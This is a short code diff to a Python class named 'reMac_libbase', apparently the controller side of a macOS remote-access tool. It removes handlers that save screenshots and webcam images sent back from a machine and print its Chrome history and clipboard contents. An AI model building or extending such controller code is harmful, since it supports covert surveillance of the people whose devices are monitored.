@@ -91,22 +91,6 @@ class reMac_libbase():
             pass
         result = json.dumps(result, indent=4, sort_keys=True)
         print(f"got result: {result}, action: {action}")
-        if action == "screenshot":
-            img = content.get("img")
-            imgdata = base64.b64decode(img)
-            filename = 'some_image.png'  # I assume you have a way of picking unique filenames
-            with open(filename, 'wb') as f:
-                f.write(imgdata)
-        elif action == "chromehist":
-            print(f"Chrome history is: {result}, action: {action}")
-        elif action == "clipboard":
-            print(f"Clipboard content is: {result}, action: {action}")
-        elif action == "webcam":
-            img = content.get("img")
-            imgdata = base64.b64decode(img)
-            filename = 'some_image_webcam_new.png'  # I assume you have a way of picking unique filenames
-            with open(filename, 'wb') as f:
-                f.write(imgdata)
 
     def _process_response_binary_content(self):
         content = self.response
